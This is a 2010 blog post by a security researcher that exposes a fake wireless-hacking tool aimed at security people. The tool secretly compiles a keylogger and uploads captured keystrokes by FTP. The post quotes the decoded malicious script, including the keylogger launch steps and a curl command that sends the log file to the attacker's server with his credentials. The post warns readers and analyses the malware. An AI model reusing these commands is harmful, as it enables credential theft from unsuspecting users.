---
layout: post
title: "How [not to] scam security people"
date: 2010-07-08
permalink: /blog/how-not-to-scam-security-people/
categories: [research]
---

I have been playing around with some wireless security for one of my customers lately. Having a pretty solid understanding of how things work, but also having been challenged to try out “everything there is to try” by the client, I went off to look for new tools that I might not have tried before.

It did not take too long, and with the accidental help of <a href="http://techcrunch.com/2010/07/05/employees-challenged-to-crack-facebook-security-succeed/">TechCrunch</a> (btw TechCrunch - you may want to change this link to something else after you read this...) I ran into <a href="http://fadzilmahfodh.blogspot.com/2009/07/8-wpa-hack-without-using-dictionary.html">this</a> “Wifi Security” site.

Yes, I know, the design is horrible, the scrolling thing on the top of the page is just missing a &lt;blink&gt; tag to drive you into an epileptic seizure, and the music, well, it’s music as part of a website - welcome to the 80’s.

<img class="alignright size-full wp-image-485" title="used-by-fbi" src="http://www.iamit.org/assets/uploads/2010/07/used-by-fbi.png" alt="" width="188" height="176" />Not being deterred by the horrible design, I went ahead and downloaded the “tools” offered in the article. After all, the FBI are using this guy’s tools...
A quick look, and I was faced with three supposed shell scripts (ended with a .sh), and a tarball called “rogue.tar.gz”.
When you get a shellscript that isn’t a shellscript, and is being reported as an “ELF” executable, you should get your detective hat on, which is exactly what I did.
It didn’t take long, and the scam unfolded pretty quickly. Here’s a quick recap of what’s going on with this guy’s website:
<ol style="list-style-type: decimal;">
	<li>The provided “tools” aren’t even security tools. Initially I figured - ok, so this guy packed a few open source wireless tools and scripted them for easy usage. No. Not even <a href="http://theta44.org/karma/index.html">karma</a> which the main script suggests that is being used (appropriately I might add for the purpose of what this script is SUPPOSED to do).</li>
	<li>A quick look at the tarball revealed that is actually contains a keylogger that has been graciously stolen from <a href="http://code.google.com/p/logkeys/">here</a>.</li>
	<li>When the main script (karma.sh) is run, two supporting scripts (bg1.sh and bg2.sh) are launched. They are taking care of compiling the keylogger, running it, and pushing the logged keys logfile to an FTP for the attacker (I guess we can call him that now) to use at his convenience.</li>
	<li>You are prompted to log into your webmail account, send a request for a free activation code with an indemnity text, which would be answered by the “automatic” processes on their end promptly so you can enter the code into the installer and start playing around with WiFi security. FTW!</li>
</ol>
Observant readers may notice that I referred to the tool as having “supposed” script files, that are actually binaries, and now I refer back to them as scripts. What gives?
Well, simply put, our attacker didn’t really take the time to code an application, he just wrote a couple of shell scripts, and in order to try to hide his malicious and ill-intent actions he “compiled” them with a utility that packs shellscripts in executable form called <a href="http://www.unixref.com/manPages/shc.html">shc</a>. The road from a linux executable to realizing what the script originally was is pretty short...

Now, that most of the cards are on the table, we can actually take a look at what scam this guy is running, and how he runs this. Following are some snippets from the shellscript that was presumably a wireless security tool. Even if you are not an avid Linux shellscripter, I’m sure that the annotations (true to the original) will shed some light...
<blockquote># START BACKGROUND PROGRAMS BG1(RUN LINUX KEYLOGGER) AND BG2(RUN MONITORING KEYSTROKES AND SEND LOG.TXT FILES TO DRIVEHQ)
cd lkl2
./configure --silent
make --silent
make install --silent
cd
chmod +x /root/bg1.sh
nohup /root/bg1.sh &amp;
rm -r /root/nohup.out
chmod +x /root/bg2.sh
nohup /root/bg2.sh &amp;
sleep 2
rm -r /root/nohup.out
clear</blockquote>
So, we see how the keylogger is compiled, installed and the supporting scripts bg1 and bg2 are run.
Next up, is the installer itself (if one can call that) which prompts for the user to send a FREE activation request to the attacker:
<blockquote># MENU LIST
echo “”
echo “--------------------------------------------------------- “
echo “THIS MESSAGES WILL NOT APPEAR AFTER karma.sh IS ACTIVATED “
echo “--------------------------------------------------------- “
echo “”
echo “1. Compose indemnity text below and send to <a href="mailto:fadzilmahfodh@gmail.com">fadzilmahfodh@gmail.com</a>”
echo “   Yes, I want activation code and will never use for illegal purpose”
echo “”
echo “2. Check your email for activation code after sending text “
echo “”
read -p “3. Send now ? (0=no, 1=yes) “ act
clear</blockquote>
Obviously, the message WILL appear, as this thing is NEVER going to be activated - remember - this is a shellscript, and the “menu” appears as-is unconditionally so you can try to activate this until blue in the face... but we are getting ahead of ourselves.

I mentioned in the title that the scam is targeting security people. Besides the obvious wireless security related topic, here’s another little piece of “evidence” from the script:
<blockquote>read -p  "Which backtrack are you using ? (bt3=3,bt4=4) " bt</blockquote>
Our little friend is assuming that we are using BackTrack (as most security folks do) to run their wireless tests... the script continues according to which version of BT is entered (to accommodate the differences in network configuration...).
I’ll skip through the network connectivity checks (trust me), and next up the attacker makes sure that firefox isn’t running, and:
<blockquote>firefox https://login.yahoo.com/ &amp;
sleep 4
firefox https://www.google.com/accounts/ManageAccount &amp;
sleep 4
firefox http://home.live.com/</blockquote>
The attacker obviously wants us to log into one of our webmail accounts so we can send him that activation request email with the indemnity text (how considerate). Keeping in mind that the keylogger is on and it’s activities are uploaded in the background to the attacker’s FTP - this is exactly where most people will fall into the trap.

And for the grand finale - the actual activation (you’d think huh?):
<blockquote>############################
# DECOY FOR ACTIVATION CODE
clear
echo ""
read -p "ENTER ROGUE AP ACTIVATION CODE : " pls
sleep 3
echo "You have entered an invalid code "
echo ""
exit
############################</blockquote>
You have to admit that commented code is the best! It’s actually saying “decoy”! How f*&amp;^ing awesome is that? You get to craft your email after logging into your Yahoo!/Gmail/Live account, and then go back to this completely useless activation part. I do like the fact that the author put a “sleep 3” before letting you know that you entered the wrong code. As if it was hard at work verifying it. Classic.

That’s about it for the technical analysis, but it wouldn’t be complete without the actual interaction with the attacker, wouldn’t it? Let’s see - so, we crafted a “request for free activation” email with the indemnity text in it, and guess what - we got a reply!
<blockquote>Hi

1. We are preparing  the activation code for you.

2. To make worth our while, could you consider a small donation (suggest euro 11) to support the website via Paypal a/c <a href="mailto:fadzilmahfodh@yahoo.com">fadzilmahfodh@yahoo.com</a> ?

Cheers.

EMAIL VIA MY CELLPHONE FOR FAST RESPONSE
<a href="http://fadzilmahfodh.blogspot.com">http://fadzilmahfodh.blogspot.com</a></blockquote>
So not only there is no activation code to be “prepared” for me (what? I’m going to feed it to the “decoy” and it’ll magically work?), we are being prompted to donate some cash for the poor bastard who worked so hard to make this tool for the community...
I cordially answered that:

1. Thanks. I’ll be looking forward for the activation code.

2. I'll probably consider it after being able to test out the tool.

Which was replied with a suggestion to try the trial version on his site (which relates to a completely different tool, but let’s not be too picky about it...).
Now, thankfully, I was using one of my throw-away yahoo accounts, and apparently so our attacker. If you haven’t noticed, one of the cool things in the new Yahoo! webmail is that you get an indication whether the person emailing you is online or not, and you can chat with them!
Guess what happens next...
<blockquote>----- Our chat on Wed, 7/7/10 2:53 PM -----
Iftach(2:34 PM):  hey man
Iftach(2:34 PM):  mind if a ask a couple of questions?
fadzilmahfodh(2:34 PM):  okey
Iftach(2:35 PM):  cool. I'm doing this research on security tools and their
authors...
fadzilmahfodh(2:35 PM):  okey
Iftach(2:35 PM):  saw your tool and wanted to hear about how you got to write
it, how well is it distributed in the community etc...
Iftach(2:36 PM):  does that activation thing a common practice with free tools?
fadzilmahfodh(2:36 PM):  yes see, we need to maintain our website thus we need
supporter
fadzilmahfodh(2:37 PM):  everyday there are at least 500++ people asking for
code
Iftach(2:37 PM):  I see.
fadzilmahfodh(2:37 PM):  i no longer able to provide for free
fadzilmahfodh(2:37 PM):  too time consuming and i need to be compensated for my
time and effort
fadzilmahfodh(2:38 PM):  hope you understand</blockquote>
Time and effort? Right... For a scam script that doesn’t even have any networking functionality... Ok, I’ll go along...
<blockquote>Iftach(2:40 PM):  now, about the tool - that's a linux binary obviously (thought
it was a shell script at the beginning). Did you base it on something existing
or write yourself?
fadzilmahfodh(2:41 PM):  i wrote it by my self then scramble the code
Iftach(2:41 PM):  hence the activation i see...
fadzilmahfodh(2:42 PM):  i can afford to give 'free lunch' to everybody. Hope
you understand
Iftach(2:43 PM):  sure, i understand.
fadzilmahfodh(2:43 PM):  So you interested in the software?
Iftach(2:44 PM):  more from a research point of view - for an article I'm
writing
Iftach(2:44 PM):  so, the installer you use, I see that it contains some
additional code that is being compiled on the client.
fadzilmahfodh(2:45 PM):  Yes. The purpose is the code will be unique to user
hardware
Iftach(2:45 PM):  and I saw that there were some FTP connections made? Is that
to verify that the client is a registered one?
fadzilmahfodh(2:46 PM):  Well, that is another story...
Iftach(2:46 PM):  I'm listening
fadzilmahfodh(2:46 PM):  maybe some other time huh
Iftach(2:47 PM):  OK. Last question - do you get a lot of account passwords
through that keylogger that sends the data to your FTP?
fadzilmahfodh(2:47 PM):  sorry, no comment unless i am in court</blockquote>
At this point of my “interview” with him, I guess that my cover was going to get pretty real, hence this “article” that you are reading... You can’t make this stuff up so I figured I’ll blog it...
<blockquote>Iftach(2:48 PM):  aha, and it's part of the installer because? just to make sure
people can send the activation email correctly?
Iftach(2:48 PM):  Back to statistics, out of the average 500 ppl asking for
activation - how many passwords do you manage to grab?
fadzilmahfodh(2:49 PM):  well, the ftp is to confirm that software match with
data in server
fadzilmahfodh(2:49 PM):  if it does not match, it will fail to run
fadzilmahfodh(2:49 PM):  or i can just change the data/activation code in the
server
fadzilmahfodh(2:49 PM):  then everything will not run
Iftach(2:49 PM):  and how does that relate to the keylogging?
fadzilmahfodh(2:50 PM):  well, that i another story...
Iftach(2:51 PM):  I mean - the keylogger data is sent to that FTP. Is that part
of the verification or is this a separate process?
Iftach(2:51 PM):  So, on average, how many accounts you manage to get on that
FTP server per day?
fadzilmahfodh(2:51 PM):  well, you do not even support my website and how the
hell am i going to tell you
Iftach(2:52 PM):  Let's just get it straight - I'm not going to "support" the
site... I'm just doing some research on security tools.
fadzilmahfodh(2:52 PM):  bye
Iftach(2:53 PM):  You are free to tell, or not if you don't want to. But I'm
publishing the story as it is...
Iftach(2:53 PM):  With your acknowledgment that you use a keylogger to steal your
site visitor passwords. Unless you want to be quoted otherwise in the story...</blockquote>
True to my chat with Fadzil (or whatever his name is), I’m telling it the way it is.

But wait, there’s more!!! more? how come? well, just to put some icing on this, I went back and decoded the script that was in charge of the FTP upload...
<blockquote>curl -s -k --ftp-ssl -T /pentest/log.txt -u fadzilmahfodh:buaya ftp://ftp.drivehq.com/code$number.txt</blockquote>
Just to see the final lameness come to life as I tested the account:

<a href="http://www.iamit.org/assets/uploads/2010/07/wpid-ftpfail-2010-07-8-09-48.png"><img src="http://www.iamit.org/assets/uploads/2010/07/wpid-ftpfail-2010-07-8-09-48.png" alt="wpid-ftpfail-2010-07-8-09-48.png" width="514" height="178" /></a>

And you know what - it’s all our fault! If we as a community would have “donated” to this guy for all his hard work and effort that he’s been putting in creating tools that are used by the FBI (check out his site...), he would have had the money to keep his driveHQ account in order and could make a decent living out of ripping people off.

Seriously.

p.s. you can find me talking about this entertaining even on <a href="http://www.isdpodcast.com/episode-167-targeting-security-newbies-w-iftach-ian-amit/">the ISDPodcast</a> with my buddy Rick, I just had to vent off before putting this in writing, so hopefully this account is a bit more thorough and to your liking...

<strong>Update 7/13/2010</strong>: I could not have wished for better response from the community on this post, but having the actual culprit respond here is priceless. As you can probably see, Fadzil has posted a comment, and to sum things up let me just state that I'm not that surprised by its content (I think it's called "pulling a ligatt" these days...). On one hand he offhandedly dismisses that there was ever such an issue with a keylogger, on the other hand he promises a better version with (and I'm quoting): "rogue ap + fake login page + keylogger + ftp = to get WPA or WPA2 password".

You don't say?! I'm still waiting for the security practitioner that will explain to me why would anyone need a keylogger + ftp to use a rogue AP with fake login pages. I'm really hoping that this post helps the community learn more on criminals such as the one we are dealing with here. Don't be tempted to "smooth-talk" that tries to look technical and hackerish while having nothing behind it. And if you have had any additional experiences with this guy feel free to add them to the comments or email me so I'll update this story for everyone's benefit.